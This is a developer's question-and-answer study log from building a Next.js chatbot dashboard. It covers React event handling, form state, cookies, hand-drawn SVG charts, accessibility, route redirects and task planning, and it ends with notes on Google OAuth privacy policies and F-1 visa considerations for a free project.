> The ConfirmDialog modal closes when the user clicks the backdrop (the darkened area around the panel). The first draft used `onMouseDown`; the reviewer flagged a subtle UX bug. What's the difference?

`onMouseDown` fires the moment the user presses the mouse button. `onClick` fires only after a press-then-release pair where both events happen on the same target. This distinction matters for backdrop dismissal because users sometimes click-and-drag - they start a click inside the modal panel, accidentally drag the cursor onto the backdrop, then release. With `onMouseDown` on the backdrop, the dismissal fires the moment they press the button anywhere on the backdrop - including the case where they pressed inside the panel and dragged out. Wait, let me reread the actual failure case: with `onMouseDown` on the backdrop, the press inside the panel doesn't trigger backdrop dismissal because the press target is the panel. But: press on backdrop → drag onto panel → release - the `mousedown` fired with `target = backdrop`, so dismissal triggers IMMEDIATELY on press, even though the user dragged into the panel before releasing. That's the bug. A user who pressed the backdrop intending to dismiss, then second-guessed mid-click and dragged into the panel, gets dismissed anyway.

`onClick` waits for the full press-release pair on the same target. If the user presses on the backdrop and releases on the panel, no click event fires on the backdrop. If they press on the panel and release on the backdrop, no click fires on the backdrop either. Only press-and-release-both-on-backdrop dismisses.

**The generalizable rule: for destructive or commit-style actions, use `onClick`. For UI state transitions where the user's intent is unambiguous from the press alone, `onMouseDown` is faster-feeling.** Examples of the latter: opening a dropdown menu (press is enough - the user is engaging the trigger), starting a drag operation. Examples of the former: dismissing a modal, submitting a form, firing a destructive action. The half-second of "feels faster" from `onMouseDown` is not worth the "I clicked and the modal dismissed before I could change my mind" experience.

> The pattern `e.target === e.currentTarget` - what's actually being compared?

`currentTarget` is the element the handler is bound to (the backdrop `<div>`). `target` is the deepest element the event originated on (could be the backdrop, or any descendant - the panel, the buttons, the title text). The equality check narrows "anywhere in the backdrop subtree" to "the backdrop itself." Without it, clicking the panel's title text would bubble up to the backdrop's handler and dismiss the dialog - because the click event propagated. The check is the standard "did this event originate on me, not on a descendant?" guard.

You can also write this as `e.target !== panelRef.current` (if you have a ref to the panel) or use `stopPropagation()` on the panel's onClick. Both work; the `target === currentTarget` form is the most compact and doesn't require setting up refs.

---

### State Seeded From Props vs. Synced From Props - Edit Forms Want The Former (Stage 6 Slice 6.5)

> The settings form takes `initialName`, `initialHeadline`, etc. as props and seeds `useState` with them. A reviewer suggested adding `useEffect([initialName], () => setName(initialName))` to sync state when the parent re-renders with new props (e.g. after `router.refresh()`). Why is that the wrong call for an edit form?

Two competing failure modes. **Failure mode A (the synced-from-props pattern):** the user starts editing the name field, types halfway through "Jane Doe", and the parent server-component re-renders for some unrelated reason - maybe a sibling component fired a router.refresh(), maybe a sub-route invalidated its data. The new render passes the SAME `initialName="Jane"` prop (since nothing was saved yet). With a sync-from-props effect, `setName("Jane")` runs and clobbers "Jane D" - the user's typed-but-not-yet-saved input vanishes. **Failure mode B (the seed-once pattern):** the user saves successfully, the parent re-renders with the new `initialName="Jane Doe"`, but the local `name` state is also "Jane Doe" (the user just typed it). State and prop agree; `dirty` is false. The user starts a second edit, types "Jane Doe Updated", `dirty` is true again because the render-body comparison `name !== initialName` uses the latest prop value. No bug. Edit B continues working.

The reviewer's concern was that "state holds the old value forever after the first save." That's incorrect because `dirty` is computed in the render body each render - it always sees the latest `initialName` prop. The state holds the user's current typing; the prop holds the server's last-saved value; the diff between them is `dirty`. Each render evaluates `dirty` fresh.

**The general principle:** an edit form's state IS the user's draft. It should persist across parent re-renders even when the parent's props update. The user has typed something; the form's job is to remember that until the user explicitly discards (cancel) or commits (save). Treating the form as a one-way derived view of props is wrong for editing surfaces - that's the read-only view pattern, not the editor pattern. The correct rule: **read-only views sync from props every render; edit forms seed from props once and persist user input until save or unmount.**

> When IS sync-from-props the right pattern?

When the props ARE the canonical state - read-only displays, derived dashboards, status indicators that follow server state with no user input. Examples: a notification badge whose count is "whatever the server says." Examples of the wrong pattern: any form with user-typed input. The dividing line is whether the user can modify the displayed value. If yes, the value is shared between user and server; the form needs an explicit save action to commit user changes, and the state must persist across re-renders. If no, syncing from props is the simpler, correct pattern.

> The hard navigation pattern (router.push instead of router.refresh) was suggested as an alternative - what's the tradeoff?

`router.push` unmounts the current component and mounts a fresh instance, so `useState` initializers run again with the new props. The user's draft is gone - which is fine after a successful save (nothing to preserve) but bad mid-edit. `router.refresh()` re-fetches the RSC tree and patches the DOM, preserving client state. For "after a save, show the updated server values" the choice between them is mostly aesthetic - both work, push is slower (full mount), refresh is faster (state preserved). For "user is mid-edit and we need fresh server data" - neither is right; that's a sync conflict that needs a UI-level resolution (warn the user, give them a merge view). The current pattern (refresh after save) is the standard happy-path choice.

---

### Cookies As Server-Component-Readable Per-User State (Dashboard Slice A)

> The dashboard sidebar shows a workspace card for the currently-selected bot. The selection needs to persist across page navigations and survive a reload. Where should that single value live?

There are three reasonable places for a small per-user preference that the server needs to read at render time: a cookie, a database column, or a session-store (Redis / KV / etc.). The right answer depends on three questions: who needs to read it, who needs to write it, and how often it changes.

For a "which bot am I viewing in the dashboard" preference, the answers are: the server (every dashboard RSC render needs it for the URL pill, embed snippet, View live bot link), the user via a UI control, and rarely (once or twice a session at most). **A cookie wins on every axis.** The server reads it via `cookies()` in any RSC for free. The write is a single server action call that fires when the user picks a different bot. There's no infrastructure to provision, no DB migration, no Redis lease to manage. The browser persists the value across sessions automatically.

```ts
// Read (any RSC, layout, or page)
import { cookies } from "next/headers";
const selected = cookies().get("probot.selectedBot.v1")?.value ?? null;

// Write (server action only)
("use server");
cookies().set("probot.selectedBot.v1", botId, {
  maxAge: 60 * 60 * 24 * 365,
  httpOnly: true,
  sameSite: "lax",
  path: "/",
});
```

The DB column would have been overkill (a write on every selection change for a non-durable preference) and the session store would have introduced an infra dependency for a value that fits in 36 characters. **The general rule: for small per-user preferences that the server needs at render time AND that the user is the only writer, reach for cookies first.** DB columns are right when the preference must survive a logout / device switch; session stores are right when many writers race or the value must be invalidated globally.

> Why `httpOnly: true` when the value isn't a secret?

Two reasons. **Defense in depth.** The bot ID is a UUID, not a credential - XSS reading it can't escalate privilege. But XSS exfiltrating the list of UUIDs a user owns is still information the attacker shouldn't trivially harvest. Setting `httpOnly` blocks `document.cookie` access without breaking any client behavior because the value is never used client-side. **Free hardening.** The cost of `httpOnly: true` here is zero. The cost of forgetting it later when a more-sensitive value moves into the same cookie shape is non-zero. Establish the safe default once.

> What's the trust boundary on read?

The cookie's value is user-controlled. A hostile client can set `probot.selectedBot.v1` to any string - including a UUID belonging to another user. The server's read path must validate the value against the user's owned bot set:

```ts
function resolveSelectedBotId(validIds: string[], fallbackId: string | null) {
  const raw = cookies().get(COOKIE)?.value;
  if (raw && validIds.includes(raw)) return raw;
  return fallbackId;
}
```

This is the same shape as any client-supplied identifier validation - never trust the value on its face; intersect with what the authenticated user can legitimately reference. The `selectBotAction` server action that writes the cookie does the same check before writing, but the read-side filter is the actual tenancy boundary because cookies can be set out-of-band (e.g. via a browser extension or a previous account's session).

---

### Catmull-Rom → Cubic Bézier For Smooth SVG Charts Without A Chart Library (Dashboard Slice A)

> The dashboard's "Conversations" chart needs a smooth curve through 7 daily counts. Chart.js / Recharts feels heavy for one chart. How small can we make this with hand-rolled SVG?

The minimal smooth-line-through-points algorithm is **Catmull-Rom interpolation**, and it translates almost trivially into SVG cubic Bézier (`C` command) segments. The mechanic: for each pair of adjacent data points `(P[i], P[i+1])`, you derive two control points using the two neighboring data points `P[i-1]` and `P[i+2]` for the tangent direction. The curve smoothly interpolates **through** every data point (unlike a Bézier where the points are control handles, not the curve itself).

```ts
function smoothPath(points: { x: number; y: number }[]): string {
  let d = `M ${points[0].x} ${points[0].y}`;
  for (let i = 0; i < points.length - 1; i++) {
    const p0 = points[i - 1] ?? points[i]; // wrap at edges
    const p1 = points[i];
    const p2 = points[i + 1];
    const p3 = points[i + 2] ?? p2;
    const cp1x = p1.x + (p2.x - p0.x) / 6;
    const cp1y = p1.y + (p2.y - p0.y) / 6;
    const cp2x = p2.x - (p3.x - p1.x) / 6;
    const cp2y = p2.y - (p3.y - p1.y) / 6;
    d += ` C ${cp1x} ${cp1y}, ${cp2x} ${cp2y}, ${p2.x} ${p2.y}`;
  }
  return d;
}
```

That's the entire algorithm. ~10 lines, zero dependencies. The `/ 6` factor is the standard Catmull-Rom tension of 1 - tweaking it (`/4` for tighter curves, `/8` for looser) controls how aggressively the curve bulges between points.

**Why this beats reaching for a library:** for a single seven-point line chart with a known data shape, the chart library would pull in 30+ KB of bundled JS for axis scaling, data formatting, tooltip handling, theming, accessibility primitives, and animation hooks that this surface doesn't use. The hand-rolled version is 50 lines including the fill-gradient and dot markers, and it ships zero dependencies. **The general rule: when the chart has a fixed shape (line / bar / sparkline) and a known small data range, hand-rolling SVG is almost always smaller, faster, and more themeable than a library.** Libraries win when you need many chart types, dynamic axis units, or tooltip-heavy interactivity.

> What about the edge cases - one point, two points, zero data?

Each one needs explicit handling because the loop assumes at least two adjacent points. **One point**: emit `M x y` and stop (no curve, just a dot - usually the visible `<circle>` markers cover this). **Two points**: the loop runs once; `p0 = p1` and `p3 = p2` via the wrap, which collapses the Catmull-Rom to essentially a straight line between the two points. **Zero data / all-zero counts**: render a dashed horizontal baseline so the panel doesn't visually collapse to nothing. The empty-state UX matters here - a chart that just disappears when there's no data feels broken; a faint dashed line feels intentional.

> Filling the area under the curve - what changes?

Append `L lastX baseY L firstX baseY Z` to the path. That closes the curve along the chart's bottom edge into a polygon, which `<path fill="url(#gradient)">` then shades. Two paths total - one stroke (the line), one fill (the area). SVG's `<linearGradient>` lets the fill fade to transparent at the bottom for the standard "shaded region under the line" look.

> Why SVG `viewBox` + CSS `width: 100%` instead of fixed pixel dimensions?

`viewBox` defines the coordinate space the path is drawn in. The browser then scales the SVG to whatever pixel dimensions the parent allocates, preserving aspect ratio. This means the chart is fully responsive without any JS-based resize handling - drop it in a flex/grid container at any width and it renders correctly. The internal coords are abstract (e.g., 700×200); the screen pixels float independently.

---

### The Dual-Tree Mobile Shell Pattern - One Trigger, One Panel, One Shared State (Dashboard Slice A)

> The dashboard sidebar needs to slide in from the left on mobile. The hamburger button belongs at the top-left of the topbar; the slide-in panel covers most of the screen with a backdrop. They're rendered in different places but share open/close state. What's the cleanest React pattern?

There are three component pieces that need to coordinate: a **trigger** (the hamburger button, lives inside the Topbar), a **panel** (the slide-in body, lives at the layout root so it can fixed-position over everything), and a **state owner** (open/closed boolean + auto-close logic). Threading state through every intervening component would be brittle and would force the layout's server components to become client components just to pass a boolean. The clean solution is a tiny **context provider** that wraps the whole shell:

```tsx
// MobileSidebarProvider - owns the state, mounted at layout root
// MobileSidebarToggle  - uses context, lives inside the Topbar
// MobileSidebarPanel   - uses context, lives at the layout root

<MobileSidebarProvider>
  <Sidebar /> // desktop, hidden on mobile
  <main>
    <Topbar /> // contains <MobileSidebarToggle /> internally
    {children}
  </main>
  <MobileSidebarPanel>
    {" "}
    // mobile-only slide-in, content mirrors <Sidebar />
    <Sidebar />
  </MobileSidebarPanel>
</MobileSidebarProvider>
```

The trigger and panel are sibling client components communicating via context. The layout stays server-component-friendly (it just renders the provider as a wrapper). The panel mirrors the desktop sidebar's content by re-mounting the same `<Sidebar />` server component inside the slide-in container.

**The auto-close on navigation is the key UX detail.** The provider uses `useEffect(() => setOpen(false), [pathname])` so clicking any nav link inside the panel navigates the user AND closes the panel in one render cycle. Without this the panel stays open over the new page, which is jarring and broken-feeling on mobile.

```tsx
useEffect(() => {
  setOpen(false);
}, [pathname]);
```

**The body-scroll-lock is the other piece worth getting right.** While the panel is open, the page underneath should not scroll (or the touch gestures on the panel propagate to the body and the user can scroll the dashboard while the menu is "modal"). The effect snapshots `document.body.style.overflow` on mount, sets it to `"hidden"`, and restores the snapshot on cleanup. Strict Mode's double-render handles this correctly because each mount captures the value at the time of that render.

> Why mirror the sidebar in two trees instead of one responsive container?

The desktop sidebar is a static piece of chrome at the left edge of the layout. The mobile panel is a fixed-position overlay with a backdrop. CSS can change the size and position of a single sidebar via media queries, but it can't toggle "is this an overlay or a layout column?" cleanly - the layout structure differs (`flex` row with fixed sidebar vs. layered with backdrop). Rendering both trees and showing one based on screen size (`hidden lg:flex` for desktop, `lg:hidden` for the mobile panel toggle) is the simplest version of "two render strategies for two structurally different layouts." The duplicate render cost is essentially zero because only one is visible at any time, and the server-rendered HTML is small.

**The general rule for responsive chrome with structural differences:** ship two trees, gate visibility via Tailwind responsive utilities (`hidden lg:flex` / `lg:hidden`), share state via React context. CSS-only responsive sidebars work great when the structural shape is preserved (column width changes, content collapses to icons). They fall apart when one breakpoint needs an overlay and the other needs a layout column.

---

### URL-Driven Tab State + The WAI-ARIA Pairing The Roles Don't Buy You (Dashboard Slice B)

> The settings page has 5 tabs. Tab state needs to be persistent (deep-linkable, back-button-friendly) but the tabs themselves are pure UI navigation. Where should the state live?

There are three reasonable places: component-local `useState`, a URL query param, or a route segment. The first is the wrong choice for anything users might want to share or bookmark - `useState` is invisible to the URL bar. The third (route segment, e.g. `/settings/account` vs. `/settings/bot`) works but adds five file-system entries and forces each tab into its own page. **The URL query param wins for tab strips inside a single page** - `/settings?tab=bot` is one route file with internal panel switching, every tab is deep-linkable, browser back navigates between tabs cleanly, and "share this link" works without losing context.

The implementation uses `useSearchParams()` to read, `router.replace()` (not `push`) to write, and a small mapping from valid tab keys to panel components. Three details matter:

**Drop the default tab from the URL.** A canonical URL has no `?tab=account` if "account" is the default - it just has no `tab` param at all. Two URLs pointing at the same logical view should produce the same browser bar. This matches the slice-6.3 Pagination convention (`?page=1` implicit).

**Validate the incoming `?tab=` value against the known set.** A hostile or stale URL like `?tab=nonsense` should fall back to the default, not crash the page. The check is one line: `const active = TABS.some(t => t.key === requested) ? requested : DEFAULT_TAB`.

**Use `replace`, not `push`.** Tab-switching is fluid navigation; users don't expect each tab change to add a history entry. `replace` keeps the back button useful for "leave this page" instead of "step through every tab I clicked."

> The reviewer flagged that the original draft wrapped `router.replace` in `useTransition`. Why was that wrong?

`useTransition` defers non-urgent state updates so React can interrupt them with higher-priority work - typing in an input, scrolling, etc. It's designed for state updates that trigger expensive renders inside the same React tree. `router.replace()` is a navigation: it doesn't trigger a React re-render in the way `setState` does; the new route's RSC tree is fetched and patched in. Wrapping it in `startTransition` adds zero perceptible benefit (the panel switch is instant because all panels are already rendered as RSC siblings; only one is conditionally shown via context) and slightly obscures the code. **The rule of thumb:** use `useTransition` when you're calling `setState` with a value that triggers an expensive child re-render and you want the input to stay responsive during it. Don't reach for it just because "this might be slow" - that's premature optimization with a measurable readability cost.

> `role="tab"` + `aria-selected` was in the first draft. The reviewer flagged it as incomplete. What was missing?

The WAI-ARIA tabs pattern needs a **two-way pairing** to actually work for screen readers: each tab button must declare which panel it controls (`aria-controls="panel-id"`), and each panel must declare which tab labels it (`aria-labelledby="tab-id"`). Without these, a screen reader sees a `role="tab"` button and reads it as a tab, but doesn't know which `role="tabpanel"` it's connected to. The user hears "Settings, tab, Account, selected" and then has to navigate around to find the panel - there's no announcement that "this panel shows account settings" because nothing tied the two together. The fix is two ID generators and two attribute writes:

```tsx
<button id={`tab-${key}`} aria-controls={`panel-${key}`} role="tab" />
<div id={`panel-${key}`} aria-labelledby={`tab-${key}`} role="tabpanel" />
```

**The wider lesson:** semantic roles alone don't make accessible widgets - the relationships between elements matter as much as the individual labels. WAI-ARIA spec patterns specify the full graph; copying the roles without the pairings ships an incomplete experience that screen reader users can detect immediately.

---

### Reading Live Limits From The Same Module That Enforces Them - Don't Mirror Numbers (Dashboard Slice B)

> The Security tab displays the rate limits ("10/min, 200/day, 8k/msg") as read-only cards. The first draft hardcoded these numbers. The reviewer found a real bug: the actual `PER_DAY` default in the rate limiter was 50, not 200. What was the right pattern?

The bug here is the kind that sneaks past every reviewer except the one who runs `grep` on the constant name. The display number lived in the SecurityTab file; the enforcement number lived in `src/lib/ai/rate-limit.ts`. They started at different values (someone typed 200 from memory in one place; the rate-limit module had 50 as the actual default). Tests didn't catch it because tests don't render real values against constants - they render whatever fixtures the test sets up. Code review didn't catch it because reviewers don't typically grep across files for hardcoded constants. Users would see the bug instantly: "I'm hitting the rate limit at 50 requests but the settings page says 200/day."

The fix is structural, not numeric. **Import the constant from the module that enforces it.** Don't write `const perDay = 200` in the display component; write `import { PER_DAY } from "@/lib/ai/rate-limit"`. Now there's exactly one number in the codebase, and any change - including environment-variable overrides at runtime - flows automatically to the display.

```ts
// rate-limit.ts (single source of truth)
export const PER_MINUTE = Number(process.env.PROBOT_RATE_PER_MINUTE ?? 10);
export const PER_DAY = Number(process.env.PROBOT_RATE_PER_DAY ?? 50);

// SecurityTab.tsx - reads, never duplicates
import { PER_MINUTE, PER_DAY } from "@/lib/ai/rate-limit";
```

**The generalizable lesson:** any constant that has BOTH a runtime effect AND a UI display is two-faced data, and the two faces must come from the same source. The classes of bugs this pattern prevents are some of the most insidious - user-visible documentation drift, where the UI confidently claims one thing while the system enforces another. The user trusts the UI; the system enforces the code; the user gets confused or frustrated when the two don't match. The cost of an import statement is zero. The cost of explaining "actually our display is wrong; the real limit is X" to a confused user is non-zero.

> What about the 8000-char input cap that's hardcoded inside the chat route's Zod schema? Same pattern?

Same lesson, slightly different mechanics. The 8000-char limit lives inline in a Zod chain (`z.string().min(1).max(8000)`) where extracting an exported constant from a route file is awkward. The right fix is a small shared module - `src/lib/ai/limits.ts` - that exports both `MESSAGE_INPUT_MAX` (used by the chat route's Zod schema and by SecurityTab's display) and the rate limits. For Slice B I left the 8000 mirrored locally with a comment because the shared module is a Slice C follow-up - but the principle is the same: **anytime a UI surface mirrors a system constraint, the constant should live in one place and be imported into both.**

> Tests didn't catch this. What would have?

A snapshot test of the rendered SecurityTab against a hand-checked "expected display values" fixture would have caught it the first time the value drifted - but only if the fixture was written by someone who checked the rate-limit module, not by someone who typed 200 from memory. Realistically, the most reliable defense is the import pattern itself: when the constant is imported, the test doesn't need to know the value, and the bug becomes impossible to introduce.

---

### "Honest Partial UI" - Read-Only + Coming Soon Beats Half-Working Inputs (Dashboard Slice B)

> The Account tab in the design has Name, Email, Username, Password fields with a Save button. We have zero PUT /api/users endpoint today. What's the right way to ship the tab?

There are three options, two of them wrong. **Option 1: hide the entire tab until the endpoints exist.** Users see a missing tab that the design promised; the dashboard feels incomplete. **Option 2: render fully editable inputs and a working-looking Save button that 500s on submit.** Users edit confidently, click Save, hit an error - the worst outcome because the failure happens after the user invested effort. **Option 3: render the tab with the fields displayed read-only, the Save button disabled, and Coming Soon pills marking what's not yet wired.** Users see the future surface, understand it's not active yet, and aren't misled into thinking their edits would have any effect.

Option 3 is the "honest partial UI" pattern. The rules are simple. **The display reflects reality** - show the current name, email, username from the session so the tab isn't blank. **The controls are visibly disabled** - `<input disabled>` + opacity-60 styling + `cursor-not-allowed` so users can't even start typing. **The marker is explicit** - a Coming Soon pill on every disabled section header, not just a tooltip on hover. **The Save button is disabled too** - no false affordances; users shouldn't be able to click anything that would have committed an edit if the backend were live.

```tsx
<h3 className="font-bold">Profile</h3>
<ComingSoonPill />
// ...
<input disabled className="bg-neutral-50 opacity-60 cursor-not-allowed" />
// ...
<button disabled className="btn btn-primary opacity-60 cursor-not-allowed">
  Save changes
</button>
```

**The generalizable principle:** a UI that promises functionality it can't deliver erodes user trust faster than a UI that ships an incomplete-but-honest preview. Users tolerate "not built yet" gracefully when the labeling is clear; they don't tolerate "looked like it worked but didn't" because that's a broken promise. The Coming Soon pill is the cheapest possible labeling - gray, small, unambiguous, doesn't fight for attention with the actual content.

> When does the read-only preview pattern become misleading instead of helpful?

When the displayed values are so wrong that the user makes decisions on them. SecurityTab's earlier rate-limit display (200/day when the real limit was 50) crossed this line - the user might have planned their chat usage around the displayed number. Account tab's read-only display of the session name/email is safe because those values ARE accurate; the user just can't edit them yet. **The rule:** read-only preview is fine when the displayed value matches reality. It fails when the value is a guess at what the future state will look like. If the displayed value isn't current truth, hide the field or show "-" instead of inventing a number.

> Why ship the whole tab as Coming Soon instead of just the Save button?

Because the disabled-input + Coming Soon pill pattern composes naturally - a single visible pill at the section header tells the user "this whole section is not yet active," and the rest is consistent. Disabling just Save while letting users type into Name would create a "why is the button broken?" moment when they hit submit. The principle holds at every granularity: the boundary of "what works" should match the boundary of "what's visibly interactive." Mixing those boundaries within a single section is the user-frustration zone.

---

### Replace, Don't Delete - Redirecting Deprecated Routes For Bookmark Compatibility (Dashboard Slice C)

> The bot detail page (`/dashboard/bots/[botId]`) used to host Share/Embed/Theme + stat row + sub-nav. After the dashboard home + settings page rewrites, every one of those surfaces moved elsewhere and the route had no reason to exist. The cleanest move is to delete the file. Why redirect instead?

The route file may be redundant but the **URLs that point at it are not**. Bookmarks the user saved months ago, links inside emails the user sent recruiters with "manage your bot at probot.com/dashboard/bots/abc," links inside team Slacks, external blog posts, third-party documentation - all of those still hit the route. A hard 404 breaks every one of them. A `redirect()` preserves the user experience: they click the bookmark, they land where the content moved.

The pattern: keep the route file, replace the content with a tenancy-gated redirect.

```ts
export default async function BotDetailRedirect({ params }) {
  const session = await getServerSession(authOptions);
  if (!session?.user?.id) notFound();

  const bot = await db.query.bots.findFirst({
    where: and(eq(bots.id, params.botId), eq(bots.userId, session.user.id)),
    columns: { id: true },
  });
  if (!bot) notFound();

  redirect(`/dashboard/bots/${bot.id}/settings?tab=bot`);
}
```

Three things matter here. **The ownership gate fires before the redirect** - a non-owner gets a 404, not a redirect-to-someone-else's-settings (which would leak the existence of the bot ID). **The redirect target uses `bot.id` from the DB row, not the raw URL param** - so if the param shape ever changes (e.g. case sensitivity), the redirect target stays canonical. **The target includes the query param** that lands on the right tab inside the destination page - keeps the user oriented within the new IA.

> When should you actually delete a route file vs. redirect?

Delete when the URL was never user-facing - internal API routes nobody bookmarked, dev-only debug pages, surfaces gated behind feature flags that never shipped to users. Redirect when there's any realistic chance someone has the URL captured somewhere outside the codebase: shared chat links, public profile URLs, content surfaces, settings page deep links. **The cost of a 13-line redirect file is essentially zero; the cost of breaking a year of accumulated external links is real.** Default to redirect.

The redirect's lifetime is the URL's lifetime - once you're confident no external traffic hits the old path (analytics shows zero hits for 6+ months), the redirect can be deleted. Not before.

---

### Tests Forcing Accessibility - `useId()` Came Out Of A Failing `getByLabelText` Call (Dashboard Slice C)

> The slice C test backfill for BotConfigTab failed on the very first spec: `screen.getByLabelText(/bot name/i)` couldn't find the input. The component renders a `<label>` next to an `<input>` inside a wrapper `<div>`. Why didn't it work?

Testing-library's `getByLabelText` mirrors what screen readers see - and **screen readers don't pair adjacent label+input siblings the way humans visually do**. Two ways to pair a label with an input get recognized as accessible: (1) the `<label>` wraps the `<input>` as a parent, or (2) the `<label>` has a `htmlFor` attribute matching the `<input>`'s `id`. A bare sibling pair inside a `<div>` doesn't satisfy either, so screen readers announce "edit text, blank" - they don't know which label the input is for. The test failure was a direct signal of the missing accessibility wiring.

The fix is `useId()`, React 18's stable per-component-instance id generator:

```tsx
function LabeledInput({ label, value, onChange }) {
  const inputId = useId();
  return (
    <div>
      <label htmlFor={inputId}>{label}</label>
      <input id={inputId} value={value} onChange={...} />
    </div>
  );
}
```

`useId()` is the right tool here because the ids need to be **unique per LabeledInput instance**, **stable across renders** (so the test query matches the same element every time), and **safe under React Strict Mode + SSR** (where naive Math.random or counter approaches produce hydration mismatches). React generates ids that satisfy all three.

> Why not just hardcode the id from the label text?

Two reasons. **Collisions**: rendering two LabeledInputs with the same label text on the same page (rare but real - settings page has "Name" appearing in Account tab AND in Bot configuration tab) would produce duplicate ids, and the second input would steal the click events meant for the first. **SSR/hydration**: a hardcoded id is deterministic across server and client (good), but slugifying a user-supplied label string introduces a tight coupling between the visible text and the underlying DOM contract - change the label and you break the id. `useId()` decouples the two.

> The broader lesson?

**Accessibility tests aren't separate from functional tests** - they're often the same query. When `getByLabelText` fails, the bug is the same bug a blind user would hit. When `getByRole("dialog")` fails, the bug is the same bug a keyboard user would hit. The testing-library API is designed around screen-reader-equivalent queries on purpose. Following the same path makes accessibility passing-through-tests an automatic side effect, not a separate compliance pass.

The flip side: when a test query you'd expect to work fails, **the bug is probably an accessibility gap, not a test bug**. Reach for the semantic fix first (`htmlFor`+`id`, proper `role`, `aria-label` where labels are visually absent), not the test workaround (`querySelector('input')`, `data-testid`, etc.). The latter hides the underlying accessibility problem; the former fixes it AND makes the test pass.

---

### Stage-N Task Block - Append-Only Deferred Work Beats Scattered TODOs (Dashboard Slice C)

> Slices A, B, and C each shipped with deferred items: AI model & key editor, custom instructions field, growth pills wiring, response time tracking, top topics NLP, GDPR endpoints, shared constants module, docs site stub. By the end of slice C there were ten items spread across three session-history entries. How do you keep them from getting lost?

The default failure mode is scattered TODO comments + GitHub issues + Slack messages + half-remembered conversations. Three slices in, the team can't tell which deferred items are real Stage 7 work vs. abandoned ideas vs. already-done. The work-back from "what's left?" becomes archaeology.

The pattern that works: **a single append-only task block in plan.md, scoped to the destination stage**. The slice that defers an item is responsible for writing it down. The block lives at a stable anchor (`#### 7.11 Dashboard Redesign - Stage 7 Follow-ups`) so future contributors can grep for it. Each item is its own subsection with the concrete what + how shape, not just a name:

```markdown
**B. Custom instructions field (Slice B placeholder → live field)**

- Schema migration: `ALTER TABLE bots ADD COLUMN custom_instructions text`.
- `botInput` + `botPatchInput` Zod widening: `.max(2000)` cap, trimmed.
- Prompt builder reads it; append to the system prompt as an
  "Author instructions" block between the personality prose and the
  immutable rules so user-supplied content can't override the safety
  rules.
```

Three properties matter here. **Append-only**: the block grows; items aren't edited or moved until they ship. **Per-item what+how**: a future contributor reads "B" and knows what to build, not just what's missing. **Anchored at the destination stage**: when a Stage 7 contributor starts work, they read §7 from the top and the §7.11 block is right there, in context with the rest of Stage 7's scope.

> Why not GitHub issues?

GitHub issues are great for community contributions and bug tracking, but they're a separate surface from the planning doc the team uses for "what are we building?" Issues live in the issue tracker; plans live in `plan.md`. Splitting them means a contributor reads plan.md, sees no mention of "AI model & key editor," concludes it's not on the roadmap. Or sees a stale GitHub issue and isn't sure if it's still real. **One source of truth for "what's planned" beats two slightly-out-of-sync sources every time.** GitHub issues are right for bugs and community asks; plan.md is right for engineering scope.

> When does the block format start failing?

When the deferred items grow beyond what one developer can hold in their head - 30+ items, or items with intricate dependency graphs. At that scale, project-management tooling (Linear, Jira, GitHub Projects) starts paying off. But for a 10-item Stage 7 punch list, plan.md is the right granularity. **The cost of a tool is the cognitive overhead of operating it; reach for the tool only when the cost of NOT having it exceeds that overhead.** A Stage 7 contributor opening Linear, filtering by label, finding the deferred items, mapping them back to plan.md context - that's more friction than scrolling to §7.11.

---

### Google OAuth Verification & the Privacy Policy as Risk Reducer

> Why does Google OAuth need a privacy policy, and what specifically must it say?

Google's OAuth verification flow is a brand-safety gate, not a legal one. When you ask Google to display a real consent screen with your app's name and logo (instead of the scary "unverified app" warning), Google's reviewers manually check that your app discloses how it handles Google user data. The privacy policy URL must:

1. Live on the **same registered domain** as the app's homepage. A policy on `notion.so/yourname` won't pass - it has to be at `yourdomain.com/privacy`. This is why the (marketing) route group goes inside the Next.js app, not on a separate Notion/GitHub Pages site.
2. Disclose **what scopes are requested** (literally name them: `openid`, `email`, `profile`).
3. Disclose **what fields are stored** from Google (email, display name, profile image URL, provider account ID).
4. Disclose **how Google data is used** with explicit negatives - "not for advertising, not for AI training, not transferred to third parties." Negatives matter because reviewers can confirm absence; positive claims like "used responsibly" tell them nothing.
5. Reference compliance with the **Google API Services User Data Policy** (the canonical URL is `developers.google.com/terms/api-services-user-data-policy`). The "Limited Use" attestation is the standard wording - it's only strictly required for restricted scopes (Gmail, Drive, etc.) but including it for basic scopes makes verification faster.
6. Provide a **data deletion mechanism** - for non-API-using apps, "email us, we delete within N days" is sufficient.

A common misconception: "I don't collect much data, so I don't need a policy." That's backwards. The Google reviewer's question is "did you disclose what you do collect?", not "did you collect a lot?". A policy disclosing "we store email + name + image, that's it, and here's how to delete" passes faster than a vague policy promising the moon.

> Why does having a privacy policy LOWER your legal risk, not raise it?

Three layers, each pointing the same direction:

1. **Platform compliance** - Google won't verify without one, Apple won't accept iOS apps without one, Stripe won't onboard without one. Not having a policy doesn't avoid scrutiny; it just blocks every business gate that requires one.
2. **Statutory compliance** - GDPR (Article 13/14), CCPA, Virginia's CDPA, Maryland's MODPA, and most modern privacy laws apply to anyone collecting personal data from their residents, regardless of operator size or revenue. The policy + deletion mechanism is what gets you compliant. The triggering act is _collecting an email address_, not _running a business_. A free hobby project collecting emails is subject to the same baseline as a Fortune 500 - the law doesn't ask whether you're paid.
3. **Tort liability** - the warranty disclaimer and liability cap in the Terms of Service are what protect a personal hobbyist from being sued over bad AI output. Without ToS, you're at the default-in-jurisdiction posture, which for AI products is unsettled and risk-on. With ToS and a $1 liability cap, the user has explicitly accepted the limited recourse. Courts generally enforce these caps for free services because they reflect the consideration exchanged.

The frame to internalize: a privacy policy is **disclosure documentation**, not liability creation. You owe whatever you owe under law regardless of what you publish. Publishing the policy just makes the obligations legible, which (a) satisfies platform reviewers and (b) shifts disputes from "what is the default?" to "what did the user agree to?"

> What's the specific F-1 visa interaction with running a free open-source project?

F-1 restrictions police _unauthorized employment / earning income_, not _publishing software under your name_. The bright line is monetization:

- **Safe (typical for F-1 portfolio projects):** free product, no payments, no ads, no sponsorships, no donations, no "pay what you want," no Patreon, no "Pro tier coming soon" hinting at intent to earn. Open-source contributions on your portfolio fall squarely in hobby/educational use.
- **Becomes risky:** ANY revenue stream. Even a $5/month Patreon for a free product can trigger USCIS scrutiny under "unauthorized employment" - the work isn't the issue, the income is.

The privacy policy and ToS themselves are NOT the risk surface. The risk surface is the existence of revenue. Operating as "an individual, non-commercial maintainer" in the policies matches reality and is the lowest-friction framing. The alternative - forming an LLC - costs money AND can itself be a problem under F-1 rules (active business management is generally not permitted, though passive investment is). For a free portfolio project, the personal-operator framing is correct and safest.

> Why is the liability cap set to USD $1, not $0?

